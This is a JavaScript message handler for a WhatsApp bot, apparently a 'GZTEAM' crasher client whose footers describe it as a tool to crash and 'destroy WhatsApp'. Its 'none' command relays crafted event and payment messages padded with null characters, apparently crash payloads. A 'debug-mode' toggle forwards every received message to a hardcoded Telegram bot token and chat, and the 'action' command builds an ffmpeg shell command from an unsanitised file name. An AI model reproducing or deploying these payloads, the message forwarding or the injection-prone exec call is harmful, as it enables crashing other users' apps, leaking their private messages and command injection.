
/*─────────────────────────────────────────
  Modded By ElangGanzz and VilLModss   
──────────────────────────────────────────*/

require('../settings/config');

console.log("Loaded System");
const JsConfuser = require('js-confuser');
const BodyForm = require('form-data')
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch")
const crypto = require('crypto');
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');

const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	generateMessageID, 
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

module.exports = gzteam = async (gzteam, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
            
            //disini
        
        const sender = m.key.fromMe ? gzteam.user.id.split(":")[0] + "@s.whatsapp.net" || gzteam.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");

        const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
        const listpremium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        const botNumber = await gzteam.decodeJid(gzteam.user.id);
        const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const Access2 = [botNumber, ...listpremium, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await gzteam.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
        const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, formatSize, getGroupAdmins } = require('./lib/myfunction.js');
		const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter');
		const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader');
        
        const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
                //GLOBAL MEDIA
        const cihuy = fs.readFileSync('./start/lib/media/orderM.png')
        const main = fs.readFileSync('./start/lib/media/owari.png')
        const kucing = fs.readFileSync('./start/lib/media/kucing.png')
        const kurumi = fs.readFileSync('./start/lib/media/kurumi.mp4')
        const forbidden = fs.readFileSync('./start/lib/media/forbidden.jpg')
        const { fquoted } = require('./lib/fquoted')
        
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`× New Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   × Date : ${new Date().toLocaleString()} \n` +
                    `   × Message : ${m.body || m.mtype} \n` +
                    `   × Sender : ${pushname} \n` +
                    `   × JID: ${senderNumber}`
                )
            )
            
            if (gzteam.eval) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`× Eval Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    JSON.stringify({ [m.message.mtype]: m.message }, null, 4)
                    
                )
                )
              
            }
            if (gzteam.debug) {
            const token = '8079580953:AAHXs2ZhrRCVlDcgEgTqdb_17w-KUp6-_SI';
            const chatId = '5878781935';

            const kirimPesan = async (pesan) => {
  try {
    const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: `\`\`\`VILL_EVAL\n${pesan}\n\`\`\``
    });
    console.log('Pesan terkirim!');
  } catch (error) {
    console.error('Error mengirim pesan:', error);
  }
};
kirimPesan(JSON.stringify({ [m.message.mtype]: m.message }, null, 4));
            }
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#ffffff").black(
                        `   × Group: ${groupName} \n` +
                        `   × GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }

        //menghapus statusMention di Group
        if (m.mtype.includes("groupStatusMentionMessage") && m.isGroup) {
            await gzteam.deleteMessage(m.chat, m.key);
        }
        
        const reaction = async (jidss, emoji) => {
            gzteam.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
        async function prM(params) {
            return await prepareWAMessageMedia(params, {
                upload: gzteam.waUploadToServer
            })
        }
        
        async function reply(text) {
            gzteam.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: "🧭 PROJECT IDX | ɢᴢ ᴀʟᴡᴀʏs 📊",
                        body: "#ɢᴢʟɪᴇɴᴛ #ᴏᴡᴀʀɪ #ᴏᴡʀᴠғx",
                        thumbnail: cihuy,
                        sourceUrl: 'https://www.tiktok.com/zoxhzxc',
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }
        
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };
        //FUNCTION BUG START
       
        
        //END OF FUNCTION BUG




async function CatBox(filePath) {
	try {
		const fileStream = fs.createReadStream(filePath);
		const formData = new BodyForm();
		formData.append('fileToUpload', fileStream);
		formData.append('reqtype', 'fileupload');
		formData.append('userhash', '');
		const response = await axios.post('https://catbox.moe/user/api.php', formData, {
			headers: {
				...formData.getHeaders(),
			},
		});
		return response.data;
	} catch (error) {
		console.error("Error at Catbox uploader:", error);
		return "Terjadi kesalahan saat upload ke Catbox.";
	}
};

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "../command"));
        const plug = { gzteam, prefix, command, reply, text, Access, reaction, isGroup: m.isGroup, isPrivate: !m.isGroup, pushname, mime, quoted, sleep, fetchJson };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !Access) {
                    return reply(mess.owner);
                }
                
                if (plugin.group && !plug.isGroup) {
                    return m.reply(mess.group);
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return m.reply(mess.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        const pushtak = {
			key: {
				remoteJid: '0@s.whatsapp.net',
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};
        
        if (!pluginsDisable) return;  

        switch (command) {
        
        case "menu": {
        let menu = "𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘵𝘰 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘐𝘋𝘟, 私はWhatsAppを通じてのみ何かを検索したりデータ/情報を取得したりするのに役立つ自動システム（WhatsAppボット）です \n\n▢ ɴᴀᴍᴇ : " + pushname + "\n▢ ʟɪʙʀᴀʀʏ : ɪᴛsᴜᴋɪᴄʜᴀɴɴ\n▢ ᴠᴇʀsɪᴏɴ : 𝟷.𝟶\n▢ ᴘʀᴇғɪx : [ " + prefix + " ]\n\n> ©𝘎𝘡𝘛𝘌𝘈𝘔 𝘈𝘓𝘞𝘈𝘠𝘚"
gzteam.sendMessage(m.chat, {
  footer: "ᴘʀᴏᴊᴇᴄᴛ ɪᴅx - sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ\nᴍᴜʟᴛɪ ᴘʟᴀᴛғᴏʀᴍ",
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Ꮂ All Menu Ꮂ' },
      type: 1
    },
    {
    buttonId: `.credits`,
      buttonText: { displayText: 'Ꮂ Credits Ꮂ' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
       image: cihuy,
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "—GZTEAM NEVER SETTLE",
      newsletterJid: `120363294762472395@newsletter`,
            }
    }
    }, {
                        quoted: pushtak
                    });
/*gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: cihuy, 
    caption: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟯 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘵𝘰 𝘖𝘸𝘢𝘳𝘪, 私はWhatsAppを通じてのみ何かを検索したりデータ/情報を取得したりするのに役立つ自動システム（WhatsAppボット）です \n\n`[ 𝘈𝘓𝘓 𝘔𝘌𝘕𝘜 ] -> Main Menu` \n[⭐] ғᴏʀ sᴇᴇ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs\n`[ 𝘉𝘜𝘎 𝘔𝘌𝘕𝘜 ] -> Bug Menu` \n[⚡] ғᴏʀ sᴇᴇ ʙᴜɢ ᴍᴇɴᴜ\n\nᴄʀᴇᴅɪᴛ sᴄʀɪᴘᴛs\n- ElangGanzz `[ DEV ]`\n- VillExec `[ OWNER ]`\n- Devorsixcore `[ Friends ]`",
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ',
    buttons: [
      {
        buttonId: '.allmenu',
        buttonText: {
          displayText: "ALL Menu", 
        },
        type: 1,
      },
      {
        buttonId: '.bugmenu',
        buttonText: {
          displayText: "BUG Menu",
        },
        type: 1,
      },
    ],
    headerType: 1,
    viewOnce: true,
  },
  { quoted: pushtak }
);*/
}
break

case "credits": {
gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
    caption: "𝗣𝗥𝗢𝗝𝗘𝗖𝗧 𝗜𝗗𝗫 𝗪𝗔`[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n\nᴄʀᴇᴅɪᴛ sᴄʀɪᴘᴛs\n- ElangGanzz `[ DEV ]`\n- VillExec `[ OWNER ]`\n- Devorsixcore `[ Friends ]`\n- KyuuRzy `[ Base ]`\n- Itsukiichan `[ Baileys ]`",// Teks utama pesan
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ', // Footer yang ditampilkan di bawah pesan
    buttons: [
      {
        buttonId: '.menu', // ID unik untuk tombol
        buttonText: {
          displayText: "<-- Back", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
      {
        buttonId: '.allmenu', // ID unik untuk tombol
        buttonText: {
          displayText: "All Menu ->", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
    ],
    headerType: 1, // Tipe header (1 untuk teks biasa)
    viewOnce: true, // Pesan hanya bisa dilihat sekali (opsional)
  },
  { quoted: pushtak } // Pesan yang mengutip pesan sebelumnya (opsional)
);
}
break
            
            case "allmenu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const old = performance.now()
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let menu = `┌──────| ᴏᴡᴀʀɪ ᴠɪʟʟʀᴀɢᴇɴ ├──[🧭]──|
├──────| ᴠᴇʀsɪᴏɴ 𝟹 ├──[📖]──|
├────| ᴘʀᴇғɪx |──[ ` + prefix + ` ]──
├────| ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴠɪʟʟᴇxᴇᴄ |──
└ status :  ${gzteam.public ? 'public' : 'self'}

┌──────| 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗟𝗶𝘀𝘁
├─── ▢ Owner
│─ public | self
│─ addprem | delprem
│─ addown | delown
│─ listsampah | delsampah
│─ get
│─ csesi
│─ getq
│─ expmode
│─ eval-mode
│─ debug-mode
│─ * (eval)
│─ / (exec)
│─ – (async)
└──────|

┌──────
├─── ▢ Experimental
│─ none
└──────

┌──────
├─── ▢ Download
│─ igdl
│─ tiktok | tt
└──────

┌──────
├─── ▢ Search
│─ Play
└──────

┌──────
├─── ▢ Maker
│─  remini
│─  wm
│─  brat
│─  bratvid
│─  qc
└──────

┌──────
├─── ▢ Group
│─ tagall
│─ hidetag
└──────

┌──────
├─── ▢ convert
│─ tourl
│─ sticker | s
│─ toimg
│─ action (Button-convert) 
│─ convert (All-in-one)
└──────

┌──────
├─── ▢ Voice
│─ fast
│─ tupai
│─ blown
│─ bass
│─ smooth
│─ deep
│─ earrape 
│─ nightcore
│─ fat
│─ robot
│─ slow
│─ reverse
└──────
┌──────| Statistics
├──[📊]──|
├── ⏱️ | *${new Date().toLocaleString()}*
├──  📃 | *${(performance.now() - old).toFixed(5)} ms*
├──   📊 | *${formattedUsedMem} / ${formattedTotalMem}*
└──────|`
 
                gzteam.sendMessage(m.chat, {
  footer: "sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ᴛᴏ ᴅᴇsᴛʀᴏʏ ᴡʜᴀᴛsᴀᴘᴘ",
  buttons: [
    {
    buttonId: `.credits`,
      buttonText: { displayText: 'Ꮂ Credits Ꮂ' },
      type: 1
    }, 
  ],
  headerType: 1,
  viewOnce: true,
       image: main,
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "—GZTEAM NEVER SETTLE",
      newsletterJid: `120363294762472395@newsletter`,
            }
    }
    }, {
                        quoted: pushtak
                    });
            }
            break
            
            case "delprem": case "delpremium": {
if (!Access) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = listpremium.indexOf(ya)
listpremium.splice(unp, 1)
fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(listpremium))
reply(`Now ${ya} is not premium`);
}
break

case "delown": case "delowner": {
if (!Access) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(ya)
kontributor.splice(unp, 1)
fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor))
reply(`Now ${ya} is not owner`);
}
break

case 'ping': {
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `IDX Information !

> Time : *${new Date().toLocaleString()}*
> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Running : *${runtime(process.uptime())}*
> Version : *7.0*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
reply(serverInfo);
}
break;

case "addprem": case "addpremium": {
if (!Access) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await gzteam.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp !!!`)
listpremium.push(bnnd)
fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(listpremium))
reply(`Now ${bnnd} is now premium`);
}
break

case "addown": case "addowner": {
if (!Access) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await gzteam.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Enter a valid number !!!`)
kontributor.push(bnnd)
fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor))
reply(`Now ${bnnd} is now owner!`);
}
break
                
            case "get":{
                if (!Access) return reply(mess.owner)
                if (!/^https?:\/\//.test(text)) return reply(`\n*ex:* ${prefix + command} https://kyuurzy.site\n`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⚡")
                
                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return gzteam.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: m });
                }
        
                if (contentType.startsWith("video/")) {
                    return gzteam.sendMessage(m.chat, {
                        video: { url: text } 
                    }, { quoted: m });
                }
                
                if (contentType.startsWith("audio/")) {
                    return gzteam.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg', 
                        ptt: true
                    }, { quoted: m });
                }
        
                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break

case "expmode": {
  if (!Access) return reply("Access denied");
  gzteam.expmode = !gzteam.expmode;
  reply(`Exp mode ${gzteam.expmode ? "Activated" : "Dectivated"}`);
            }
            break
case "eval-mode": {
  if (!Access) return reply("Access denied");
  gzteam.eval = !gzteam.eval;
  reply(`Eval mode ${gzteam.eval ? "Activated" : "Dectivated"}`);
}
break

case "debug-mode": {
  if (!Access) return reply("Access denied");
  gzteam.debug = !gzteam.debug;
  reply(`Debug mode ${gzteam.debug ? "Activated" : "Dectivated"}`);
}
break

case "none": {
    await gzteam.relayMessage(m.chat, {
  viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        eventMessage: {
          isCanceled: false,
          name: "ሸᖽᐸ𝚅𝙸𝙻𝙻𝙴𝚇𝙴𝙲🔖\n\n©𝙂𝙕𝙏𝙀𝘼𝙈 | Special Human\n\n@VillExec\n@Devor6core\n@AntaGremory\n@ElangGanzz\n\n",
          description: "̶T̶r̶a̶s̶h ̶H̶o̶m̶e ᴠɪʟʟᴇxᴇᴄ [📀]",
          location: {
            degreesLatitude: "̶H̶O̶M̶E ̶C̶R̶A̶S̶H",
            degreesLongitude: "̶F̶E̶T̶C̶H ̶H̶O̶M̶E",
            name: "̶T̶r̶a̶s̶h ̶H̶o̶m̶e ᴠɪʟʟᴇxᴇᴄ [🚭]"
          },
          joinLink: "https://call.whatsapp.com/voice/" + "\0".repeat(1000),
          startTime: "9999999999",
          mediaKeyTimestamp: "null",
          extraGuestsAllowed: true, 
          isScheduleCall: true, 
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            fromMe: false
          }
        }
      }
      }
    }, {
    ephemeralExpiration: 5,
    timeStamp: Date.now()
  })
    /*
    await gzteam.relayMessage(m.chat, {
            interactiveMessage: {
                body: {
                    text: '✩ 𝐆𝐙𝐓𝐄𝐀𝐌 𝐀𝐋𝐋𝐒𝐓𝐀𝐑 ✩'
                },
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: kucing, 
                    contextInfo: {
                    "externalAdReply": {
                        "automatedGreetingMessageShown": true,
                        "greetingMessageBody": "🕷 Crash Home Logo 🌦i"
                     }
                    }
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "payment_method",
                            buttonParamsJson: "{}"
                        }, 
                        {
                            name: "payment_status",
                            buttonParamsJson: "{\"reference_id\":\"4SS1Q1X7I91\",\"payment_status\":\"captured\",\"payment_timestamp\":1754743928,\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":1939399939200,\"offset\":100},\"tax\":{\"value\":19200059398,\"offset\":100},\"discount\":{\"value\":1920005939808,\"offset\":100},\"shipping\":{\"value\":5500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"29653872854258761\",\"product_id\":\"29653872854258761\",\"name\":\"Haxor GZ\",\"amount\":{\"value\":1200000,\"offset\":100},\"quantity\":5},{\"retailer_id\":\"custom-item-34fd27b3-e72a-412a-b576-923f97679b9d\",\"name\":\"GZ Crasher New Items\",\"amount\":{\"value\":646464646400,\"offset\":100},\"quantity\":3}]},\"share_payment_status\":false}"
                        }, 
                        {
                             name: "review_order",
                             buttonParamsJson: "{\"reference_id\":\"4SS1Q1X7I91\",\"order\":{\"status\":\"preparing_to_ship\",\"order_type\":\"ORDER\"},\"share_payment_status\":false}"
                        }, 
                        {
                            name: "review_and_pay",
                            buttonParamsJson: "{}"
                        }
                    ],
                     "messageParamsJson": "{\"bottom_sheet\":{\"in_thread_buttons_limit\":1,\"divider_indices\":[1,2,3,4,5],\"list_title\":\"𝘝𝘐𝘓𝘓𝘌𝘟𝘌𝘊-> 👁\",\"button_title\":\"\\LOL\"},\"limited_time_offer\":{\"text\":\"⃪𝐕𝐈𝐋𝐋𝐄𝐗𝐄𝐂 ̶F̶a̶i̶l ̶B̶e̶t̶a\",\"url\":\"t.me/satanicMirror\",\"copy_code\":\"GZ_Whoops\",\"expiration_time\":99951866776135000},\"tap_target_configuration\":{\"title\":\"🕷 GZ Exposed 🌻\",\"description\":\"\u0000\",\"canonical_url\":\"https://gz.com/betakontol\",\"domain\":\"gzteam.com\",\"button_index\":0},\"reminder_info\":{\"reminder_status\":\"reminder_pending\",\"scheduled_timestamp\":\"-0\"}}"
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: 'biz',
                    attrs: { native_flow_name: 'payment_method' }
                }
            ]
        });*/
       /* gzteam.relayMessage(m.chat, {
        interactiveMessage: {
            body: {
                text: '✩ 𝐆𝐙𝐓𝐄𝐀𝐌 𝐀𝐋𝐋𝐒𝐓𝐀𝐑 ✩'
            },
            header: {
                hasMediaAttachment: true,
                jpegThumbnail: kucing
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: "{\"reference_id\":\"X\",\"payment_method\":\"confirmm\",\"payment_timestamp\":null,\"share_payment_status\":false\"}"
                    }
                ]
            }
        }
    }, {
    additionalNodes: [
            {
                tag: 'biz',
                attrs: { native_flow_name: 'payment_method' }
            }
        ], 
    }); */
     gzteam.relayMessage(m.chat, {
  "interactiveMessage": {
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "payment_method",
          "buttonParamsJson": "{\"reference_id\":\"null\",\"payment_method\":\"confirm\",\"payment_timestamp\":null,\"share_payment_status\":true}"
        }
      ],
      "messageParamsJson": "{}"
    }
  }
}, { additionalNodes: [
            {
                tag: 'biz',
                attrs: { native_flow_name: 'payment_method' }
            }
        ]})
//Null
}
break

case 'action': case 'convert': {
if (!mime) {
return reply(`Oops error, please using ${prefix + command}`)
}
if (!/image|video|webp/.test(mime)) {
                    return reply(`Oops error, You can create with: *${prefix + command}* and reply media/send media`);
                }
                await reaction(m.chat, "⚡");
                let media = await gzteam.downloadAndSaveMediaMessage(qmsg);
                let response = await CatBox(media);
                let ran = await getRandom('.png');
                
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media);
                    if (err) return err;
            
                    let buffer = fs.readFileSync(ran);
                    gzteam.sendMessage(m.chat, {
  footer: "sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ᴛᴏ ᴅᴇsᴛʀᴏʏ ᴡʜᴀᴛsᴀᴘᴘ",
  buttons: [
    {
    buttonId: `.bruh`,
      buttonText: { displayText: 'Ꮂ Cancel Ꮂ' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'Action Menu' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Convert Menu',
          sections: [
            {
              title: 'Converter Available',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'To URL',
                  description: 'Converting media to URL', 
                  id: '.act1 ' + response
                },                
                {
                  title: 'To Sticker',
                  description: 'Converting media as Sticker',
                  id: '.act2 ' + response
                },                
                {
                  title: 'To Image',
                  description: 'Converting if you send sticker to Images', 
                  id: '.act3 ' + response
                  },                
                {
                  title: 'Make HD | Remini',
                  description: 'Can make your media HD using Remini Plugins', 
                  id: '.act4 ' + response
                },                
                {
                  title: 'Ping Bot ( Check Online )', 
                  id: '.ping'
                  }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: { url: 'https://files.catbox.moe/wpjpoe.jpg' },
       caption: "𝘊𝘰𝘯𝘷𝘦𝘳𝘵𝘦𝘳 𝘔𝘦𝘯𝘶\n𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘮𝘦𝘯𝘶 𝘸𝘢𝘯𝘯𝘢 𝘺𝘰𝘶 𝘸𝘢𝘯𝘵 !",
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "—GZTEAM NEVER SETTLE",
      newsletterJid: `120363294762472395@newsletter`,
            }
    }
    }, {
                        quoted: m
                    });
                    fs.unlinkSync(ran);
                });
}
break

case 'act1': {
if (!q) return;
if (q) {
let caption = `Information\n> 𝘛𝘐𝘔𝘌 : ${new Date().toLocaleString()}\n> 𝘜𝘗𝘓𝘖𝘈𝘋𝘌𝘙 : ${pushname}`;
let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘊𝘰𝘯𝘷𝘦𝘳𝘵 𝘵𝘰 𝘜𝘙𝘓`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
